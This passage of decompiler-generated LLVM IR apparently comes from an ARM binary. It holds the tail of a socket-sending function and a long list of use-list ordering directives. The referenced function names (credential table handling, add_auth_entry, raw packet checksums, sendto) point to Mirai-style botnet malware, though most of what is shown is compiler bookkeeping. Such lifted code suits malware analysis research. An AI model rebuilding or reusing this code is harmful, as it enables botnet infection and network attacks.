  %v2_fc78 = inttoptr i32 %v1_fc78 to i8*
  %v3_fc78 = load i8, i8* %v2_fc78, align 1
  %v4_fc78 = zext i8 %v3_fc78 to i32
  store i32 %v4_fc78, i32* %r2.global-to-local, align 4
  %v0_fc7c = load i32, i32* @r4, align 4
  store i32 %v0_fc7c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc84 = call i32 @__libc_send(i32 %v0_fc7c, i32 %v2_fc74, i32 %v4_fc78, i32 16384)
  %v0_fc88 = load i32, i32* @r8, align 4
  %v1_fc88 = add i32 %v0_fc88, 13
  store i32 %v1_fc88, i32* %r1.global-to-local, align 4
  %v0_fc8c = load i32, i32* @r4, align 4
  store i32 %v0_fc8c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc98 = call i32 @__libc_send(i32 %v0_fc8c, i32 %v1_fc88, i32 1, i32 16384)
  %v0_fc9c = load i32, i32* @r4, align 4
  store i32 %v0_fc9c, i32* %r0.global-to-local, align 4
  %v0_fca0 = load i32, i32* @r8, align 4
  %v1_fca0 = add i32 %v0_fca0, 13
  %v2_fca0 = inttoptr i32 %v1_fca0 to i8*
  %v3_fca0 = load i8, i8* %v2_fca0, align 1
  %v4_fca0 = zext i8 %v3_fca0 to i32
  store i32 %v4_fca0, i32* %r2.global-to-local, align 4
  %v1_fca4 = add i32 %v0_fca0, 4
  %v2_fca4 = inttoptr i32 %v1_fca4 to i32*
  %v3_fca4 = load i32, i32* %v2_fca4, align 4
  store i32 %v3_fca4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcac = call i32 @__libc_send(i32 %v0_fc9c, i32 %v3_fca4, i32 %v4_fca0, i32 16384)
  %v0_fcb0 = load i32, i32* @r4, align 4
  store i32 %v0_fcb0, i32* %r0.global-to-local, align 4
  %v1_fcb4 = call i32 @__GI___libc_close(i32 %v0_fcb0)
  store i32 %v1_fcb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc10

; uselistorder directives
  uselistorder i32 %v2_fc18.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_fc38.pre-phi, { 1, 0 }
  uselistorder i1 %v7_fb8c, { 1, 0 }
  uselistorder i32 %v3_fb88, { 1, 0, 2, 3 }
  uselistorder i32 %v3_fb0c, { 1, 0 }
  uselistorder i1 %v3_fafc, { 1, 0 }
  uselistorder i32 %v0_fae0, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_faac, { 2, 1, 0, 3 }
  uselistorder i32 %v3_faa8, { 1, 0 }
  uselistorder i32 %v0_faa0, { 1, 0 }
  uselistorder i32 %v3_fa20, { 1, 0 }
  uselistorder i1 %v2_f9ec, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f9d4, { 1, 0 }
  uselistorder i32 %v0_f9d0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f9a8, { 1, 0 }
  uselistorder i32 %v0_f9a8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f8f8.pr, { 1, 0 }
  uselistorder i32 %v0_f8c4, { 1, 2, 0 }
  uselistorder i32 %v4_f864, { 1, 0, 2 }
  uselistorder i1 %v7_f840, { 1, 0 }
  uselistorder i32 %v1_f7e8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f7e8, { 0, 2, 1 }
  uselistorder i32 %v0_f7e0, { 1, 0 }
  uselistorder i1 %v7_f7dc, { 1, 0 }
  uselistorder i1 %v7_f7d4, { 1, 0 }
  uselistorder i1 %v7_f7cc, { 1, 0 }
  uselistorder i1 %v8_f7c4, { 1, 0 }
  uselistorder i1 %v7_f7a8, { 1, 0 }
  uselistorder i1 %v7_f7a0, { 1, 0 }
  uselistorder i1 %v7_f798, { 1, 0 }
  uselistorder i1 %v8_f790, { 1, 0 }
  uselistorder i32 %v1_f778, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f724, { 1, 0 }
  uselistorder i32 %v4_f718, { 1, 0, 2 }
  uselistorder i32 %v1_f6e4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f6e4, { 0, 2, 1 }
  uselistorder i32 %v0_f6dc, { 1, 0 }
  uselistorder i1 %v7_f6d8, { 1, 0 }
  uselistorder i1 %v7_f6d0, { 1, 0 }
  uselistorder i1 %v8_f6c8, { 1, 0 }
  uselistorder i1 %v7_f6ac, { 1, 0 }
  uselistorder i1 %v7_f6a4, { 1, 0 }
  uselistorder i1 %v8_f69c, { 1, 0 }
  uselistorder i32 %v1_f684, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f620, { 1, 0 }
  uselistorder i8 %v3_f618, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f610, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f610, { 0, 2, 1 }
  uselistorder i32 %v0_f608, { 1, 0 }
  uselistorder i1 %v7_f604, { 1, 0 }
  uselistorder i1 %v7_f5fc, { 1, 0 }
  uselistorder i1 %v7_f5f4, { 1, 0 }
  uselistorder i1 %v7_f5e0, { 1, 0 }
  uselistorder i1 %v7_f5d8, { 1, 0 }
  uselistorder i1 %v7_f5d0, { 1, 0 }
  uselistorder i1 %v8_f5c8, { 1, 0 }
  uselistorder i32 %v1_f5b0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f4d4, { 1, 0 }
  uselistorder i8 %v3_f4cc, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f4c4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f4c4, { 0, 2, 1 }
  uselistorder i32 %v0_f4bc, { 1, 0 }
  uselistorder i1 %v7_f4b8, { 1, 0 }
  uselistorder i1 %v7_f4b0, { 1, 0 }
  uselistorder i1 %v7_f4a8, { 1, 0 }
  uselistorder i1 %v7_f494, { 1, 0 }
  uselistorder i1 %v7_f48c, { 1, 0 }
  uselistorder i1 %v7_f484, { 1, 0 }
  uselistorder i1 %v8_f47c, { 1, 0 }
  uselistorder i32 %v1_f464, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f400, { 1, 0 }
  uselistorder i8 %v3_f3f8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f3f0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f3f0, { 0, 2, 1 }
  uselistorder i32 %v0_f3e8, { 1, 0 }
  uselistorder i1 %v7_f3e4, { 1, 0 }
  uselistorder i1 %v7_f3dc, { 1, 0 }
  uselistorder i1 %v7_f3d4, { 1, 0 }
  uselistorder i1 %v7_f3c0, { 1, 0 }
  uselistorder i1 %v7_f3b8, { 1, 0 }
  uselistorder i1 %v7_f3b0, { 1, 0 }
  uselistorder i1 %v8_f3a8, { 1, 0 }
  uselistorder i32 %v1_f390, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f37c, { 1, 0 }
  uselistorder i32 %v1_f374, { 1, 0 }
  uselistorder i32 %v1_f36c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f368, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f368, { 0, 2, 1 }
  uselistorder i32 %v0_f348.pr, { 1, 0 }
  uselistorder i32 %v0_f328.pr, { 1, 0 }
  uselistorder i1 %v7_f300, { 1, 0 }
  uselistorder i1 %v2_f2f0, { 1, 0, 2 }
  uselistorder i1 %v2_f2d4, { 1, 0, 2 }
  uselistorder i32 %v1_f2f4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f2c8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f2f8, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f25c, { 1, 0 }
  uselistorder i8 %v3_f254, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f24c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f24c, { 0, 2, 1 }
  uselistorder i32 %v0_f244, { 1, 0 }
  uselistorder i1 %v7_f240, { 1, 0 }
  uselistorder i1 %v7_f238, { 1, 0 }
  uselistorder i1 %v7_f230, { 1, 0 }
  uselistorder i1 %v7_f21c, { 1, 0 }
  uselistorder i1 %v7_f214, { 1, 0 }
  uselistorder i1 %v7_f20c, { 1, 0 }
  uselistorder i1 %v8_f204, { 1, 0 }
  uselistorder i32 %v1_f1ec, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f188, { 1, 0 }
  uselistorder i8 %v3_f180, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f178, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f178, { 0, 2, 1 }
  uselistorder i32 %v0_f170, { 1, 0 }
  uselistorder i1 %v7_f16c, { 1, 0 }
  uselistorder i1 %v7_f164, { 1, 0 }
  uselistorder i1 %v7_f15c, { 1, 0 }
  uselistorder i1 %v7_f148, { 1, 0 }
  uselistorder i1 %v7_f140, { 1, 0 }
  uselistorder i1 %v7_f138, { 1, 0 }
  uselistorder i1 %v8_f130, { 1, 0 }
  uselistorder i32 %v1_f118, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f104, { 1, 2, 0 }
  uselistorder i32 %v2_f0f0, { 1, 0 }
  uselistorder i32 %v0_f0f0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f0ec, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_f0c4, { 2, 1, 0 }
  uselistorder i1 %v7_f0a0, { 1, 0 }
  uselistorder i32 %v4_f09c, { 1, 0, 2 }
  uselistorder i32 %v1_f05c, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f040, { 1, 0 }
  uselistorder i32 %v1_f030, { 2, 1, 0 }
  uselistorder i32 %v1_f02c, { 1, 0 }
  uselistorder i32 %v0_efd0, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_efac, { 1, 2, 3, 0 }
  uselistorder i32 %v3_efa8, { 1, 0 }
  uselistorder i32 %v4_ef8c, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_ef78, { 1, 0, 2 }
  uselistorder i32 %v3_ef74, { 1, 0, 2 }
  uselistorder i32 %v0_fa30, { 1, 0, 2 }
  uselistorder i32 %v3_ef40, { 1, 0 }
  uselistorder i32 %v1_ef28, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ef24, { 1, 0 }
  uselistorder i32 %v3_ef1c, { 1, 2, 0 }
  uselistorder i1 %v7_ef0c, { 1, 0 }
  uselistorder i32 %v3_ef08, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_eefc, { 1, 0 }
  uselistorder i32 %v1_eea4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eea4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ee88, { 0, 2, 1 }
  uselistorder i32 %v1_ee80, { 1, 0 }
  uselistorder i32 %v1_ee40, { 2, 1, 0 }
  uselistorder i32 %v1_ee3c, { 1, 0 }
  uselistorder i1 %v2_ee1c, { 1, 0, 2 }
  uselistorder i32 %v0_ee18, { 1, 0, 2 }
  uselistorder i1 %v7_ede4, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_ede4, { 1, 0, 2 }
  uselistorder i32 %v2_eddc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_edd0, { 1, 0, 2 }
  uselistorder i32 %v0_edd4, { 1, 0 }
  uselistorder i32 %v1_edb8, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_edac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_edac, { 0, 2, 1 }
  uselistorder i32 %v1_ed9c, { 1, 0 }
  uselistorder i32 %v3_ee68, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_ecfc, { 1, 0 }
  uselistorder i32 %v1_ece4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ecf0, { 0, 3, 2, 1 }
  uselistorder i32 %v0_eca0, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_ec94, { 2, 1, 0 }
  uselistorder i32 %v1_ec74, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_ec50, { 1, 0 }
  uselistorder i1 %v9_ec1c, { 1, 0 }
  uselistorder i32 %v0_ebcc, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb70, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_eb20, { 1, 0 }
  uselistorder i32 %v5_eab8, { 1, 0 }
  uselistorder i32 %v3_eaa8, { 1, 2, 0 }
  uselistorder i16 %v4_eaa4, { 1, 0 }
  uselistorder i32 %v3_eaa4, { 1, 0 }
  uselistorder i1 %v2_e9e0, { 1, 0 }
  uselistorder i1 %v2_e9cc, { 1, 0 }
  uselistorder i1 %v2_e9b8, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_e994, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e97c, { 1, 0 }
  uselistorder i1 %v3_e960, { 1, 0, 2 }
  uselistorder i1 %v2_e94c, { 1, 0 }
  uselistorder i1 %v2_e928, { 1, 0 }
  uselistorder i32 %v1_e8d8, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e8c4, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e8c0, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e8a8, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e890, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f9c0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f804, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f8ac, { 1, 2, 0 }
  uselistorder i32 %v2_ee74, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e868, { 0, 2, 4, 7, 6, 8, 1, 3, 5, 9, 10 }
  uselistorder i32 %v4_e738, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e6cc.le, { 1, 0 }
  uselistorder i32 %v0_e6b0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e684, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e650, { 1, 0 }
  uselistorder i32 %v3_e648, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_e634, { 1, 0 }
  uselistorder i32 %v2_e618, { 1, 0, 2 }
  uselistorder i32 %v0_e604, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e578, { 3, 1, 2, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 78, 80, 81, 83, 82, 111, 112, 35, 106, 62, 63, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 64, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 137, 138, 140, 139, 136, 141, 164, 165, 142, 143, 163, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 110, 161, 162, 84, 85, 86, 87, 88, 89, 90, 91, 93, 92, 95, 94, 103, 96, 97, 98, 99, 100, 101, 102, 104, 105, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 35, 36, 37, 49, 50, 51, 80, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 78, 79, 96, 97, 99, 98, 95, 115, 100, 116, 101, 113, 114, 102, 103, 104, 105, 106, 107, 108, 109, 110, 93, 111, 112, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77 }
  uselistorder i32* %r1.global-to-local, { 50, 51, 52, 53, 54, 55, 56, 42, 44, 43, 45, 57, 58, 59, 29, 46, 47, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 103, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 87, 88, 48, 49, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* %r0.global-to-local, { 110, 109, 111, 112, 113, 115, 114, 116, 117, 118, 119, 121, 122, 120, 82, 81, 83, 85, 84, 86, 87, 88, 90, 89, 23, 25, 126, 123, 1, 3, 2, 4, 124, 125, 0, 127, 91, 167, 59, 61, 60, 93, 92, 94, 96, 95, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 196, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 73, 75, 74, 77, 76, 79, 78, 80, 102, 104, 103, 105, 101, 106, 107, 180, 166, 170, 168, 169, 175, 171, 172, 108, 173, 174, 176, 178, 177, 179, 181, 186, 182, 185, 183, 184, 189, 187, 188, 192, 190, 191, 194, 193, 165, 164, 195, 128, 129, 131, 130, 133, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 153, 152, 154, 159, 155, 156, 157, 158, 160, 161, 162, 163 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 10, 0, 11, 14, 12, 13, 15, 23, 16, 17, 18, 19, 20, 21, 22, 9, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 116, 117, 202, 128, 185, 2, 21, 22, 132, 133, 118, 184, 120, 122, 123, 73, 74, 75, 76, 77, 1, 119, 3, 4, 5, 14, 8, 9, 11, 12, 13, 16, 17, 18, 19, 20, 23, 121, 25, 26, 31, 27, 28, 29, 30, 32, 33, 34, 35, 36, 40, 41, 42, 37, 38, 39, 43, 44, 45, 46, 47, 48, 52, 53, 54, 49, 50, 51, 55, 56, 57, 58, 59, 60, 64, 65, 66, 61, 62, 63, 67, 68, 69, 70, 71, 72, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 129, 95, 96, 97, 92, 93, 94, 98, 99, 100, 101, 102, 103, 107, 108, 109, 104, 105, 106, 110, 111, 112, 113, 114, 115, 124, 125, 126, 127, 191, 193, 192, 194, 195, 196, 197, 198, 199, 200, 201, 130, 131, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 215, 217, 218, 216, 213, 214, 15, 10, 6, 219, 7, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 190, 152, 153, 189, 154, 155, 188, 156, 157, 158, 159, 160, 161, 187, 162, 163, 164, 165, 166, 186, 167, 168, 169, 0, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 24, 183 }
  uselistorder i1* %cpsr_c.global-to-local, { 113, 114, 199, 123, 181, 2, 127, 16, 17, 128, 115, 180, 116, 118, 119, 73, 74, 75, 76, 1, 187, 3, 4, 5, 15, 8, 9, 11, 13, 14, 18, 19, 20, 21, 22, 23, 117, 25, 26, 31, 27, 28, 29, 30, 32, 33, 34, 35, 36, 40, 41, 42, 37, 38, 39, 43, 44, 45, 46, 47, 48, 52, 53, 54, 49, 50, 51, 55, 56, 57, 58, 59, 60, 64, 65, 66, 61, 62, 63, 67, 68, 69, 70, 71, 72, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 124, 92, 93, 94, 89, 90, 91, 95, 96, 97, 98, 99, 100, 104, 105, 106, 101, 102, 103, 107, 108, 109, 110, 111, 112, 120, 121, 122, 188, 190, 189, 191, 192, 193, 194, 195, 196, 197, 198, 125, 126, 200, 201, 202, 203, 204, 205, 206, 207, 210, 212, 213, 211, 208, 209, 12, 10, 6, 214, 7, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 185, 147, 148, 184, 149, 150, 183, 151, 152, 153, 154, 155, 156, 182, 157, 158, 159, 160, 161, 186, 162, 163, 164, 0, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 24, 179 }
  uselistorder i32 (i32)* @inet_addr, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_18fcc.88 to i32), { 0, 2, 1, 3 }
  uselistorder i16** @global_var_21904.141, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_21904.141 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 14, 13, 12, 11, 10, 9, 8, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 26, 39, 38, 25, 32, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 24, 0, 22, 21, 20, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 36, 12, 13, 14, 11, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32)* @table_unlock_val, { 22, 21, 30, 29, 28, 27, 26, 25, 24, 23, 20, 0, 18, 17, 16, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_218f0.196, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i16* bitcast (i32* @global_var_218e2.193 to i16*), { 1, 0, 2 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 10, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_19048.185 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_18fec.163 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_218f9.160, { 1, 0 }
  uselistorder i16* @global_var_218ee.159, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_218ec.154, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_218ec.154 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_218f8.155, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_218d8.151, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_218d8.151 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
